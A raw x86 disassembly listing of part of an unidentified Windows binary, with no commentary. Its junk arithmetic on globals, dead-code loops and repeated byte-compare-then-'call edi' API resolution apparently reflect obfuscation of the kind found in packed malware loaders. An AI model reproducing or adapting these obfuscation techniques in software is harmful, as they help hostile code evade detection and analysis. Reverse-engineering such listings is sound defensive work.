  420708:	mov    ecx,DWORD PTR [ebp-0x30]
  42070b:	mov    edx,DWORD PTR [ebp-0x2c]
  42070e:	mov    edx,0xa143
  420713:	xor    cx,dx
  420716:	mov    edx,DWORD PTR [ebp-0x1c]
  420719:	mov    edx,DWORD PTR [edx+0xc]
  42071c:	add    cx,si
  42071f:	cmp    WORD PTR [eax+edx*1],cx
  420723:	jne    0x42073c
  420729:	mov    ecx,DWORD PTR ds:0x428373
  42072f:	mov    ecx,DWORD PTR [ecx+0x198]
  420735:	mov    DWORD PTR [ecx],eax
  420737:	jmp    0x420797
  42073c:	push   DWORD PTR [ebp+0x1c]
  42073f:	push   DWORD PTR [ebp+0x18]
  420742:	jmp    0x420786
  420747:	mov    eax,DWORD PTR [ebp+0x18]
  42074a:	mov    ecx,DWORD PTR [ebp+0x1c]
  42074d:	cmp    eax,0x70941f99
  420752:	jne    0x42076b
  420758:	cmp    ecx,ebx
  42075a:	jne    0x42076b
  420760:	push   ebx
  420761:	push   0x70941f9f
  420766:	jmp    0x420786
  42076b:	mov    eax,DWORD PTR [ebp+0x18]
  42076e:	mov    ecx,DWORD PTR [ebp+0x1c]
  420771:	cmp    eax,0x70941f9f
  420776:	jne    0x420797
  42077c:	cmp    ecx,ebx
  42077e:	jne    0x420797
  420784:	push   ebx
  420785:	push   edi
  420786:	push   DWORD PTR [ebp+0x14]
  420789:	push   DWORD PTR [ebp+0x10]
  42078c:	push   DWORD PTR [ebp+0xc]
  42078f:	push   DWORD PTR [ebp+0x8]
  420792:	call   0x41b999
  420797:	pop    edi
  420798:	pop    esi
  420799:	pop    ebx
  42079a:	leave  
  42079b:	ret    0x18
  42079e:	push   ebp
  42079f:	mov    ebp,esp
  4207a1:	and    esp,0xfffffff8
  4207a4:	adc    DWORD PTR ds:0x428e9f,0x428e5f
  4207ae:	sub    esp,0xcc
  4207b4:	push   ebx
  4207b5:	push   esi
  4207b6:	adc    DWORD PTR ds:0x428ecb,0x428e7f
  4207c0:	push   edi
  4207c1:	lea    eax,[esp+0x58]
  4207c5:	push   eax
  4207c6:	mov    BYTE PTR [esp+0xda],0x0
  4207ce:	and    DWORD PTR ds:0x428e83,0x428eb7
  4207d8:	call   DWORD PTR ds:0x42a9f7
  4207de:	mov    DWORD PTR ds:0x428e9f,0x6fab
  4207e8:	mov    al,ds:0x428498
  4207ed:	cmp    al,BYTE PTR ds:0x4284a9
  4207f3:	mov    DWORD PTR ds:0x428e27,0x607e
  4207fd:	je     0x42081a
  420803:	push   0x0
  420805:	xor    DWORD PTR ds:0x428e63,0x595a
  42080f:	call   DWORD PTR ds:0x42a9b3
  420815:	jmp    0x42188d
  42081a:	mov    DWORD PTR ds:0x428e37,0x550e
  420824:	mov    al,ds:0x4284b5
  420829:	mov    DWORD PTR ds:0x428e27,0x154d
  420833:	cmp    al,BYTE PTR ds:0x4284c6
  420839:	mov    DWORD PTR ds:0x428e47,0x193
  420843:	je     0x420850
  420849:	xor    eax,eax
  42084b:	jmp    0x42188d
  420850:	mov    edi,DWORD PTR ds:0x42a9c7
  420856:	adc    DWORD PTR ds:0x428e8b,0x1314
  420860:	push   0x4284cf
  420865:	push   0x4284db
  42086a:	call   edi
  42086c:	adc    DWORD PTR ds:0x428ea3,0x428e9f
  420876:	test   eax,eax
  420878:	je     0x420849
  42087e:	and    DWORD PTR ds:0x428e6f,edx
  420884:	mov    DWORD PTR [esp+0x30],0x0
  42088c:	adc    esi,0x6be4
  420892:	mov    ecx,0xf89c85a5
  420897:	mov    DWORD PTR [esp+0x20],ecx
  42089b:	mov    ebx,DWORD PTR ds:0x428ecf
  4208a1:	add    DWORD PTR ds:0x428e8f,ebx
  4208a7:	mov    DWORD PTR [esp+0xc],0xf89c85a4
  4208af:	lea    eax,[esp+0x3c]
  4208b3:	mov    DWORD PTR [esp+0x30],eax
  4208b7:	lea    eax,[esp+0x38]
  4208bb:	mov    DWORD PTR [esp+0x18],eax
  4208bf:	mov    eax,ds:0x428373
  4208c4:	mov    ebx,DWORD PTR ds:0x428edf
  4208ca:	mov    esi,DWORD PTR ds:0x42a07b
  4208d0:	sub    esi,ebx
  4208d2:	or     ebx,DWORD PTR [ebx+esi*1]
  4208d5:	mov    eax,DWORD PTR [eax+0x1c8]
  4208db:	mov    eax,DWORD PTR [eax]
  4208dd:	and    DWORD PTR ds:0x428eaf,0x0
  4208e7:	mov    ebx,DWORD PTR ds:0x428eaf
  4208ed:	inc    ebx
  4208ee:	mov    DWORD PTR ds:0x428eaf,ebx
  4208f4:	cmp    DWORD PTR ds:0x428eaf,0x2d
  4208fb:	jle    0x42091e
  420901:	jmp    0x420911
  420906:	push   0x428189
  42090b:	call   DWORD PTR ds:0x42a9cb
  420911:	cmp    DWORD PTR ds:0x428eaf,0x1d
  420918:	jb     0x4208e7
  42091e:	mov    edx,DWORD PTR [esp+0x18]
  420922:	sub    DWORD PTR ds:0x428e37,0x428e2f
  42092c:	mov    esi,0x75108af
  420931:	and    DWORD PTR ds:0x428e5f,0x428e8b
  42093b:	xor    eax,esi
  42093d:	mov    DWORD PTR ds:0x428e53,0x1b
  420947:	cmp    DWORD PTR ds:0x428e53,0x0
  42094e:	je     0x42099d
  420954:	cmp    DWORD PTR ds:0x428e53,0x7
  42095b:	jb     0x42099d
  420961:	jmp    0x420971
  420966:	push   0x231a
  42096b:	call   DWORD PTR ds:0x42a9cf
  420971:	cmp    DWORD PTR ds:0x428e53,0x8
  420978:	jne    0x42098b
  42097e:	mov    ebx,DWORD PTR ds:0x428e53
  420984:	dec    ebx
  420985:	mov    DWORD PTR ds:0x428e53,ebx
  42098b:	mov    ebx,DWORD PTR ds:0x428e53
  420991:	dec    ebx
  420992:	mov    DWORD PTR ds:0x428e53,ebx
  420998:	jmp    0x420947
  42099d:	mov    ebx,0x3272f6
  4209a2:	add    eax,ebx
  4209a4:	mov    DWORD PTR ds:0x428ec3,0x767b
  4209ae:	mov    DWORD PTR [edx],eax
  4209b0:	mov    eax,ds:0x428cef
  4209b5:	mov    DWORD PTR ds:0x428e5f,0x7551
  4209bf:	cmp    eax,0x455dedfa
  4209c4:	mov    DWORD PTR ds:0x428e9f,0x7198
  4209ce:	jne    0x420a43
  4209d4:	or     DWORD PTR ds:0x428e3b,edi
  4209da:	mov    eax,DWORD PTR [esp+0x20]
  4209de:	mov    edx,DWORD PTR ds:0x428373
  4209e4:	mov    DWORD PTR ds:0x428e63,0x33b4
  4209ee:	mov    edx,DWORD PTR [edx+0x198]
  4209f4:	xor    eax,esi
  4209f6:	inc    DWORD PTR ds:0x428e6b
  4209fc:	add    eax,ebx
  4209fe:	mov    DWORD PTR [edx],eax
  420a00:	mov    eax,DWORD PTR [esp+0x20]
  420a04:	xor    DWORD PTR ds:0x428e57,0x1a38
  420a0e:	xor    eax,esi
  420a10:	add    eax,ebx
  420a12:	adc    DWORD PTR ds:0x428e23,0x304d
  420a1c:	mov    ds:0x428cef,eax
  420a21:	and    eax,0x47de
  420a26:	mov    eax,DWORD PTR [esp+0x20]
  420a2a:	adc    DWORD PTR ds:0x428e9b,0x428e27
  420a34:	xor    eax,esi
  420a36:	add    eax,ebx
  420a38:	inc    DWORD PTR ds:0x428ebb
  420a3e:	mov    ds:0x42846b,eax
  420a43:	and    DWORD PTR ds:0x428e43,0x0
  420a4d:	mov    eax,ds:0x428e43
  420a52:	inc    eax
  420a53:	mov    ds:0x428e43,eax
  420a58:	cmp    DWORD PTR ds:0x428e43,0x28
  420a5f:	ja     0x420a82
  420a65:	jmp    0x420a75
  420a6a:	push   0x42815b
  420a6f:	call   DWORD PTR ds:0x42a9d3
  420a75:	cmp    DWORD PTR ds:0x428e43,0x1e
  420a7c:	jb     0x420a4d
  420a82:	mov    eax,ds:0x428373
  420a87:	adc    DWORD PTR ds:0x428e9f,0x428e87
  420a91:	mov    eax,DWORD PTR [eax+0x18c]
  420a97:	mov    eax,DWORD PTR [eax]
  420a99:	mov    DWORD PTR [esp+0x40],eax
  420a9d:	mov    eax,0xf89c85a1
  420aa2:	add    DWORD PTR ds:0x428ec3,0x428e3f
  420aac:	mov    DWORD PTR [esp+0x10],eax
  420ab0:	sub    DWORD PTR ds:0x428eab,0x428e2f
  420aba:	mov    DWORD PTR [esp+0x10],eax
  420abe:	and    DWORD PTR ds:0x428e97,0x428e8f
  420ac8:	mov    DWORD PTR [esp+0x10],eax
  420acc:	sub    DWORD PTR ds:0x428e9f,0x428e8f
  420ad6:	mov    DWORD PTR [esp+0x10],ecx
  420ada:	add    DWORD PTR ds:0x428e5b,0x398e
  420ae4:	mov    DWORD PTR [esp+0x18],eax
  420ae8:	adc    DWORD PTR ds:0x428ecb,0x1d27
  420af2:	mov    DWORD PTR [esp+0x18],0xf89c85bd
  420afa:	add    DWORD PTR ds:0x428e83,edi
  420b00:	mov    eax,DWORD PTR [esp+0x20]
  420b04:	sbb    DWORD PTR ds:0x428e5b,0x428ebf
  420b0e:	xor    eax,esi
  420b10:	or     DWORD PTR ds:0x428ebb,0x428e7f
  420b1a:	add    eax,ebx
  420b1c:	mov    DWORD PTR ds:0x428e37,0x4b61
  420b26:	jmp    0x420d1e
  420b2b:	mov    DWORD PTR ds:0x428ea7,0x2827
  420b35:	mov    al,ds:0x4284e8
  420b3a:	mov    DWORD PTR ds:0x428ecb,0x2eff
  420b44:	cmp    al,BYTE PTR ds:0x4284f9
  420b4a:	jne    0x420849
  420b50:	mov    DWORD PTR ds:0x428e3f,0x3779
  420b5a:	mov    al,ds:0x428505
  420b5f:	mov    DWORD PTR ds:0x428e67,0xc1e
  420b69:	cmp    al,BYTE PTR ds:0x428516
  420b6f:	jne    0x420849
  420b75:	or     DWORD PTR ds:0x428e53,0x428ec3
  420b7f:	push   0x42851f
  420b84:	or     DWORD PTR ds:0x428eb7,0x428ebb
  420b8e:	push   0x42852b
  420b93:	sub    DWORD PTR ds:0x428e9f,0x10e
  420b9d:	call   edi
  420b9f:	xor    DWORD PTR ds:0x428e93,0x265a
  420ba9:	test   eax,eax
  420bab:	je     0x420849
  420bb1:	mov    al,ds:0x428538
  420bb6:	mov    DWORD PTR ds:0x428e5f,0x67be
  420bc0:	cmp    al,BYTE PTR ds:0x428549
  420bc6:	mov    DWORD PTR ds:0x428ecb,0x75a8
  420bd0:	jne    0x420849
  420bd6:	mov    DWORD PTR ds:0x428e6f,0x3bcf
  420be0:	mov    al,ds:0x428555
  420be5:	mov    DWORD PTR ds:0x428e6b,0x562a
  420bef:	cmp    al,BYTE PTR ds:0x428566
  420bf5:	jne    0x420849
  420bfb:	adc    DWORD PTR ds:0x428e2f,0x428ec3
  420c05:	push   0x42856f
  420c0a:	add    DWORD PTR ds:0x428ecb,0x428e87
  420c14:	push   0x42857b
  420c19:	call   edi
  420c1b:	and    DWORD PTR ds:0x428e6b,0x4f9f
  420c25:	test   eax,eax
  420c27:	je     0x420849
  420c2d:	sub    eax,DWORD PTR ds:0x428e9b
  420c33:	mov    eax,DWORD PTR [esp+0xc]
  420c37:	mov    ecx,DWORD PTR [esp+0x18]
  420c3b:	add    DWORD PTR ds:0x428e93,0x1aa1
  420c45:	xor    eax,esi
  420c47:	lea    eax,[eax+ecx*1+0x3272f6]
  420c4e:	and    DWORD PTR ds:0x428e5f,0x6940
  420c58:	push   eax
  420c59:	or     eax,DWORD PTR ds:0x428e5b
  420c5f:	mov    eax,DWORD PTR [esp+0x14]
  420c63:	xor    eax,esi
  420c65:	or     DWORD PTR ds:0x428e77,0x428e6f
  420c6f:	lea    eax,[ebp+eax*1+0x3272fe]
  420c76:	adc    DWORD PTR ds:0x428eb7,0x2832
  420c80:	push   eax
  420c81:	mov    eax,ds:0x428373
  420c86:	push   DWORD PTR [eax+0x1bc]
  420c8c:	sbb    DWORD PTR ds:0x428eb7,0x428ebb
  420c96:	call   0x421896
  420c9b:	mov    eax,DWORD PTR [esp+0xc]
  420c9f:	mov    edx,DWORD PTR ds:0x428e9f
  420ca5:	or     edx,DWORD PTR ds:0x428e7b
  420cab:	mov    DWORD PTR ds:0x428e9f,edx
  420cb1:	mov    ecx,DWORD PTR [esp+0x18]
  420cb5:	mov    DWORD PTR ds:0x428e9f,0x15
  420cbf:	cmp    DWORD PTR ds:0x428e9f,0x0
  420cc6:	je     0x420d15
  420ccc:	cmp    DWORD PTR ds:0x428e9f,0x5
  420cd3:	jle    0x420d15
  420cd9:	jmp    0x420ce9
  420cde:	push   0x75d1
  420ce3:	call   DWORD PTR ds:0x42a9d7
  420ce9:	cmp    DWORD PTR ds:0x428e9f,0x6
  420cf0:	jne    0x420d03
  420cf6:	mov    edx,DWORD PTR ds:0x428e9f
  420cfc:	dec    edx
  420cfd:	mov    DWORD PTR ds:0x428e9f,edx
  420d03:	mov    edx,DWORD PTR ds:0x428e9f
  420d09:	dec    edx
  420d0a:	mov    DWORD PTR ds:0x428e9f,edx
  420d10:	jmp    0x420cbf
  420d15:	xor    eax,esi
  420d17:	lea    eax,[ecx+eax*1+0x3272f6]
  420d1e:	and    DWORD PTR ds:0x428ea3,0x0
  420d28:	jmp    0x420d3c
  420d2d:	xor    ecx,ecx
  420d2f:	add    ecx,DWORD PTR ds:0x428ea3
  420d35:	inc    ecx
  420d36:	mov    DWORD PTR ds:0x428ea3,ecx
  420d3c:	cmp    DWORD PTR ds:0x428ea3,0x1b
  420d43:	jae    0x420d83
  420d49:	cmp    DWORD PTR ds:0x428ea3,0x4
  420d50:	jle    0x420d83
  420d56:	jmp    0x420d64
  420d5b:	push   DWORD PTR [ebp-0x18]
  420d5e:	call   DWORD PTR ds:0x42a9db
  420d64:	cmp    DWORD PTR ds:0x428ea3,0x3
  420d6b:	jne    0x420d7e
  420d71:	mov    ecx,DWORD PTR ds:0x428ea3
  420d77:	inc    ecx
  420d78:	mov    DWORD PTR ds:0x428ea3,ecx
  420d7e:	jmp    0x420d2d
  420d83:	mov    ecx,DWORD PTR [esp+0xc]
  420d87:	mov    edx,DWORD PTR [esp+0xc]
  420d8b:	and    DWORD PTR ds:0x428e7f,0x27c9
  420d95:	xor    edx,esi
  420d97:	xor    ecx,esi
  420d99:	add    ecx,edx
  420d9b:	and    DWORD PTR ds:0x428eb7,0x0
  420da5:	mov    edx,DWORD PTR ds:0x428eb7
  420dab:	inc    edx
  420dac:	mov    DWORD PTR ds:0x428eb7,edx
  420db2:	cmp    DWORD PTR ds:0x428eb7,0x23
  420db9:	jg     0x420de1
  420dbf:	jmp    0x420dd4
  420dc4:	push   0x428e3f
  420dc9:	push   0x584f
  420dce:	call   DWORD PTR ds:0x42a9df
  420dd4:	cmp    DWORD PTR ds:0x428eb7,0x1b
  420ddb:	jb     0x420da5
  420de1:	mov    edx,DWORD PTR [esp+0xc]
  420de5:	mov    DWORD PTR ds:0x428e97,0x4e1f
  420def:	xor    edx,esi
  420df1:	lea    ecx,[ecx+edx*1+0x9758e2]
  420df8:	mov    DWORD PTR ds:0x428e83,0x69c
  420e02:	mov    DWORD PTR [esp+0x18],eax
  420e06:	mov    DWORD PTR ds:0x428ebf,0x5f48
  420e10:	cmp    eax,ecx
  420e12:	mov    DWORD PTR ds:0x428e3f,0x5aa0
  420e1c:	jbe    0x420b2b
  420e22:	not    eax
  420e24:	mov    eax,DWORD PTR [ebp+0xc]
  420e27:	and    ecx,0x5ce1
  420e2d:	mov    ds:0x4281f7,eax
  420e32:	mov    eax,DWORD PTR [ebp+0x10]
  420e35:	mov    DWORD PTR ds:0x428e87,0x15
  420e3f:	cmp    DWORD PTR ds:0x428e87,0x0
  420e46:	je     0x420e96
  420e4c:	cmp    DWORD PTR ds:0x428e87,0x6
  420e53:	jb     0x420e96
  420e59:	jmp    0x420e6a
  420e5e:	push   DWORD PTR [ebp-0x14]
  420e61:	push   DWORD PTR [ebp-0x1c]
  420e64:	call   DWORD PTR ds:0x42a9e3
  420e6a:	cmp    DWORD PTR ds:0x428e87,0x7
  420e71:	jne    0x420e84
  420e77:	mov    ecx,DWORD PTR ds:0x428e87
  420e7d:	dec    ecx
  420e7e:	mov    DWORD PTR ds:0x428e87,ecx
  420e84:	mov    ecx,DWORD PTR ds:0x428e87
  420e8a:	dec    ecx
  420e8b:	mov    DWORD PTR ds:0x428e87,ecx
  420e91:	jmp    0x420e3f
  420e96:	mov    ds:0x428453,eax
  420e9b:	mov    eax,ds:0x4281f7
  420ea0:	mov    ecx,DWORD PTR ds:0x428e9b
  420ea6:	adc    ecx,DWORD PTR ds:0x428ec3
  420eac:	mov    DWORD PTR ds:0x428e9b,ecx
  420eb2:	mov    ecx,DWORD PTR [esp+0x30]
  420eb6:	sub    eax,ebx
  420eb8:	xor    eax,esi
  420eba:	mov    DWORD PTR ds:0x428ecb,0x2418
  420ec4:	mov    DWORD PTR [ecx],eax
  420ec6:	mov    DWORD PTR ds:0x428e97,0x6c0e
  420ed0:	lea    eax,[esp+0x2c]
  420ed4:	mov    DWORD PTR [esp+0x44],eax
  420ed8:	mov    DWORD PTR ds:0x428ea3,0x17d
  420ee2:	lea    eax,[ebp+0x4]
  420ee5:	mov    DWORD PTR [esp+0x2c],eax
  420ee9:	mov    DWORD PTR ds:0x428ec3,0x4441
  420ef3:	mov    al,ds:0x428588
  420ef8:	cmp    al,BYTE PTR ds:0x428599
  420efe:	mov    DWORD PTR ds:0x428e47,0x46bb
  420f08:	jne    0x420849
  420f0e:	mov    al,ds:0x4285a5
  420f13:	cmp    al,BYTE PTR ds:0x4285b6
  420f19:	mov    DWORD PTR ds:0x428eaf,0x61de
  420f23:	jne    0x420849
  420f29:	mov    DWORD PTR ds:0x428ea7,0xc38
  420f33:	push   0x4285bf
  420f38:	sbb    DWORD PTR ds:0x428e8b,0x428e7f
  420f42:	push   0x4285cb
  420f47:	call   edi
  420f49:	test   eax,eax
  420f4b:	mov    DWORD PTR ds:0x428e4b,0x74a1
  420f55:	je     0x420849
  420f5b:	mov    al,ds:0x4285d8
  420f60:	mov    DWORD PTR ds:0x428e27,0x62c3
  420f6a:	cmp    al,BYTE PTR ds:0x4285e9
  420f70:	jne    0x420849
  420f76:	mov    DWORD PTR ds:0x428e5b,0x5f7d
  420f80:	mov    al,ds:0x4285f5
  420f85:	mov    DWORD PTR ds:0x428e3b,0x1797
  420f8f:	cmp    al,BYTE PTR ds:0x428606
  420f95:	jne    0x420849
  420f9b:	push   0x42860f
  420fa0:	add    DWORD PTR ds:0x428ebf,0x428eab
  420faa:	push   0x42861b
  420faf:	call   edi
  420fb1:	test   eax,eax
  420fb3:	je     0x420849
  420fb9:	mov    DWORD PTR ds:0x428e67,0x333a
  420fc3:	mov    al,ds:0x428628
  420fc8:	cmp    al,BYTE PTR ds:0x428639
  420fce:	jne    0x420849
  420fd4:	mov    DWORD PTR ds:0x428e63,0x2ea7
  420fde:	mov    al,ds:0x428645
  420fe3:	mov    DWORD PTR ds:0x428e83,0x19a
  420fed:	cmp    al,BYTE PTR ds:0x428656
  420ff3:	mov    DWORD PTR ds:0x428ec3,0xb46
  420ffd:	jne    0x420849
  421003:	xor    DWORD PTR ds:0x428e4b,0x428e9b
  42100d:	push   0x42865f
  421012:	xor    DWORD PTR ds:0x428ea7,0x428ebf
  42101c:	push   0x42866b
  421021:	adc    DWORD PTR ds:0x428e7b,0x428e97
  42102b:	call   edi
  42102d:	test   eax,eax
  42102f:	je     0x420849
  421035:	mov    DWORD PTR ds:0x428eab,0x160c
  42103f:	mov    al,ds:0x428678
  421044:	cmp    al,BYTE PTR ds:0x428689
  42104a:	mov    DWORD PTR ds:0x428e33,0x7fda
  421054:	jne    0x420849
  42105a:	mov    DWORD PTR ds:0x428eb3,0x205
  421064:	mov    al,ds:0x428695
  421069:	mov    DWORD PTR ds:0x428ea7,0x1bc1
  421073:	cmp    al,BYTE PTR ds:0x4286a6
  421079:	mov    DWORD PTR ds:0x428e2f,0xcbc
  421083:	jne    0x420849
  421089:	push   0x4286af
  42108e:	xor    DWORD PTR ds:0x428e73,0x428e53
  421098:	push   0x4286bb
  42109d:	call   edi
  42109f:	test   eax,eax
  4210a1:	mov    DWORD PTR ds:0x428e7f,0x3ee2
  4210ab:	je     0x420849
  4210b1:	mov    DWORD PTR ds:0x428e73,0x4aa5
  4210bb:	mov    al,ds:0x4286c8
  4210c0:	mov    DWORD PTR ds:0x428e73,0x2576
  4210ca:	cmp    al,BYTE PTR ds:0x4286d9
  4210d0:	jne    0x420849
  4210d6:	mov    al,ds:0x4286e5
  4210db:	mov    DWORD PTR ds:0x428eab,0x2fd2
  4210e5:	cmp    al,BYTE PTR ds:0x4286f6
  4210eb:	mov    DWORD PTR ds:0x428e77,0x665f
  4210f5:	jne    0x420849
  4210fb:	push   0x4286ff
  421100:	xor    DWORD PTR ds:0x428eab,0x43e0
  42110a:	push   0x42870b
  42110f:	call   edi
  421111:	add    DWORD PTR ds:0x428eaf,0x428e77
  42111b:	test   eax,eax
  42111d:	mov    DWORD PTR ds:0x428e7f,0x618e
  421127:	je     0x420849
  42112d:	mov    al,ds:0x428718
  421132:	mov    DWORD PTR ds:0x428ebb,0x5321
  42113c:	cmp    al,BYTE PTR ds:0x428729
  421142:	jne    0x420849
  421148:	mov    al,ds:0x428735
  42114d:	cmp    al,BYTE PTR ds:0x428746
  421153:	jne    0x420849
  421159:	adc    DWORD PTR ds:0x428ea7,0x4891
  421163:	push   0x42874f
  421168:	xor    DWORD PTR ds:0x428ecb,0x428ec3
  421172:	push   0x42875b
  421177:	call   edi
  421179:	xor    DWORD PTR ds:0x428ecb,0x428e67
  421183:	test   eax,eax
  421185:	mov    DWORD PTR ds:0x428e77,0x34d8
  42118f:	je     0x420849
  421195:	mov    DWORD PTR ds:0x428e63,0x47d8
  42119f:	mov    al,ds:0x428768
  4211a4:	mov    DWORD PTR ds:0x428ebb,0x60f8
  4211ae:	cmp    al,BYTE PTR ds:0x428779
  4211b4:	mov    DWORD PTR ds:0x428e63,0x352f
  4211be:	jne    0x420849
  4211c4:	mov    al,ds:0x428785
  4211c9:	mov    DWORD PTR ds:0x428e37,0x65de
  4211d3:	cmp    al,BYTE PTR ds:0x428796
  4211d9:	mov    DWORD PTR ds:0x428e3f,0x2ba7
  4211e3:	jne    0x420849
  4211e9:	push   0x42879f
  4211ee:	sbb    DWORD PTR ds:0x428e6b,0x25d3
  4211f8:	push   0x4287ab
  4211fd:	call   edi
  4211ff:	adc    DWORD PTR ds:0x428ebf,0x428ea3
  421209:	test   eax,eax
  42120b:	mov    DWORD PTR ds:0x428e6f,0x1c88
  421215:	je     0x420849
  42121b:	not    DWORD PTR ds:0x428e63
  421221:	mov    al,ds:0x4287b8
  421226:	cmp    al,BYTE PTR ds:0x4287c9
  42122c:	jne    0x420849
  421232:	mov    al,ds:0x4287d5
  421237:	mov    DWORD PTR ds:0x428e7b,0x5e30
  421241:	cmp    al,BYTE PTR ds:0x4287e6
  421247:	mov    DWORD PTR ds:0x428e9b,0x700f
  421251:	jne    0x420849
  421257:	or     DWORD PTR ds:0x428e83,0x99a
  421261:	push   0x4287ef
  421266:	adc    DWORD PTR ds:0x428e9f,0x22ee
  421270:	push   0x4287fb
  421275:	adc    DWORD PTR ds:0x428ecb,0x428ec3
  42127f:	call   edi
  421281:	sub    DWORD PTR ds:0x428e43,0x72f1
  42128b:	test   eax,eax
  42128d:	je     0x420849
  421293:	mov    DWORD PTR ds:0x428e57,0x70e
  42129d:	mov    al,ds:0x428808
  4212a2:	cmp    al,BYTE PTR ds:0x428819
  4212a8:	jne    0x420849
  4212ae:	mov    al,ds:0x428825
  4212b3:	mov    DWORD PTR ds:0x428ea3,0x4a62
  4212bd:	cmp    al,BYTE PTR ds:0x428836
  4212c3:	mov    DWORD PTR ds:0x428ea7,0x4507
  4212cd:	jne    0x420849
  4212d3:	sbb    DWORD PTR ds:0x428e23,0x428e6f
  4212dd:	push   0x42883f
  4212e2:	xor    DWORD PTR ds:0x428e2b,0x428e87
  4212ec:	push   0x42884b
  4212f1:	or     DWORD PTR ds:0x428e8f,0x428e6b
  4212fb:	call   edi
  4212fd:	test   eax,eax
  4212ff:	mov    DWORD PTR ds:0x428ec7,0x3c0e
  421309:	je     0x420849
  42130f:	mov    DWORD PTR ds:0x428e2f,0x1c83
  421319:	mov    al,ds:0x428858
  42131e:	cmp    al,BYTE PTR ds:0x428869
  421324:	jne    0x420849
  42132a:	mov    al,ds:0x428875
  42132f:	mov    DWORD PTR ds:0x428eab,0x7836
  421339:	cmp    al,BYTE PTR ds:0x428886
  42133f:	mov    DWORD PTR ds:0x428e33,0x5d16
  421349:	jne    0x420849
  42134f:	push   0x42888f
  421354:	or     DWORD PTR ds:0x428e6f,0x428e43
  42135e:	push   0x42889b
  421363:	adc    DWORD PTR ds:0x428e6f,0x64ad
  42136d:	call   edi
  42136f:	and    DWORD PTR ds:0x428e93,0x428eb3
  421379:	test   eax,eax
  42137b:	je     0x420849
  421381:	mov    al,ds:0x4288a8
  421386:	cmp    al,BYTE PTR ds:0x4288b9
  42138c:	mov    DWORD PTR ds:0x428e2b,0x5e8c
  421396:	jne    0x420849
  42139c:	mov    DWORD PTR ds:0x428ea3,0x4898
  4213a6:	mov    al,ds:0x4288c5
  4213ab:	cmp    al,BYTE PTR ds:0x4288d6
  4213b1:	jne    0x420849
  4213b7:	push   0x4288df
  4213bc:	push   0x4288eb
  4213c1:	call   edi
  4213c3:	test   eax,eax
  4213c5:	mov    DWORD PTR ds:0x428ebb,0xe84
  4213cf:	je     0x420849
  4213d5:	mov    al,ds:0x4288f8
  4213da:	cmp    al,BYTE PTR ds:0x428909
  4213e0:	mov    DWORD PTR ds:0x428e3b,0x418e
  4213ea:	jne    0x420849
  4213f0:	mov    DWORD PTR ds:0x428e5b,0x25d1
  4213fa:	mov    al,ds:0x428915
  4213ff:	cmp    al,BYTE PTR ds:0x428926
  421405:	mov    DWORD PTR ds:0x428e6b,0x4b5f
  42140f:	jne    0x420849
  421415:	push   0x42892f
  42141a:	adc    DWORD PTR ds:0x428ec7,0x4db7
  421424:	push   0x42893b
  421429:	sbb    DWORD PTR ds:0x428e6b,0x428ebf
  421433:	call   edi
  421435:	sub    DWORD PTR ds:0x428e33,0x428e97
  42143f:	test   eax,eax
  421441:	mov    DWORD PTR ds:0x428ec7,0x19ef
  42144b:	je     0x420849
  421451:	mov    al,ds:0x428948
  421456:	cmp    al,BYTE PTR ds:0x428959
  42145c:	jne    0x420849
  421462:	mov    al,ds:0x428965
  421467:	cmp    al,BYTE PTR ds:0x428976
  42146d:	jne    0x420849
  421473:	push   0x42897f
  421478:	push   0x42898b
  42147d:	call   edi
  42147f:	test   eax,eax
  421481:	je     0x420849
  421487:	mov    al,ds:0x428998
  42148c:	cmp    al,BYTE PTR ds:0x4289a9
  421492:	jne    0x420849
  421498:	mov    al,ds:0x4289b5
  42149d:	cmp    al,BYTE PTR ds:0x4289c6
  4214a3:	jne    0x420849
  4214a9:	push   0x4289cf
  4214ae:	push   0x4289db
  4214b3:	call   edi
  4214b5:	test   eax,eax
  4214b7:	je     0x420849
  4214bd:	mov    al,ds:0x4289e8
  4214c2:	cmp    al,BYTE PTR ds:0x4289f9
  4214c8:	jne    0x420849
  4214ce:	mov    al,ds:0x428a05
  4214d3:	cmp    al,BYTE PTR ds:0x428a16
  4214d9:	jne    0x420849
  4214df:	push   0x428a1f
  4214e4:	push   0x428a2b
  4214e9:	call   edi
  4214eb:	test   eax,eax
  4214ed:	je     0x420849
  4214f3:	mov    al,ds:0x428a38
  4214f8:	cmp    al,BYTE PTR ds:0x428a49
  4214fe:	jne    0x420849
  421504:	mov    al,ds:0x428a55
  421509:	cmp    al,BYTE PTR ds:0x428a66
  42150f:	jne    0x420849
  421515:	push   0x428a6f
  42151a:	push   0x428a7b
  42151f:	call   edi
  421521:	test   eax,eax
  421523:	je     0x420849
  421529:	mov    al,ds:0x428a88
  42152e:	cmp    al,BYTE PTR ds:0x428a99
  421534:	jne    0x420849
  42153a:	mov    al,ds:0x428aa5
  42153f:	cmp    al,BYTE PTR ds:0x428ab6
  421545:	jne    0x420849
  42154b:	push   0x428abf
  421550:	push   0x428acb
  421555:	call   edi
  421557:	test   eax,eax
  421559:	je     0x420849
  42155f:	mov    al,ds:0x428ad8
  421564:	cmp    al,BYTE PTR ds:0x428ae9
  42156a:	jne    0x420849
  421570:	mov    al,ds:0x428af5
  421575:	cmp    al,BYTE PTR ds:0x428b06
  42157b:	jne    0x420849
  421581:	push   0x428b0f
  421586:	push   0x428b1b
  42158b:	call   edi
  42158d:	test   eax,eax
  42158f:	je     0x420849
  421595:	mov    al,ds:0x428b28
  42159a:	cmp    al,BYTE PTR ds:0x428b39
  4215a0:	jne    0x420849
  4215a6:	mov    al,ds:0x428b45
  4215ab:	cmp    al,BYTE PTR ds:0x428b56
  4215b1:	jne    0x420849
  4215b7:	push   0x428b5f
  4215bc:	push   0x428b6b
  4215c1:	call   edi
  4215c3:	test   eax,eax
  4215c5:	je     0x420849
  4215cb:	mov    al,ds:0x428b78
  4215d0:	cmp    al,BYTE PTR ds:0x428b89
  4215d6:	jne    0x420849
  4215dc:	mov    al,ds:0x428b95
  4215e1:	cmp    al,BYTE PTR ds:0x428ba6
  4215e7:	jne    0x420849
  4215ed:	push   0x428baf
  4215f2:	push   0x428bbb
  4215f7:	call   edi
  4215f9:	test   eax,eax
  4215fb:	je     0x420849
  421601:	mov    al,ds:0x428bc8
  421606:	cmp    al,BYTE PTR ds:0x428bd9
  42160c:	jne    0x420849
  421612:	mov    al,ds:0x428be5
  421617:	cmp    al,BYTE PTR ds:0x428bf6
  42161d:	jne    0x420849
  421623:	push   0x428bff
  421628:	push   0x428c0b
  42162d:	call   edi
  42162f:	test   eax,eax
  421631:	je     0x420849
  421637:	mov    eax,DWORD PTR [esp+0x3c]
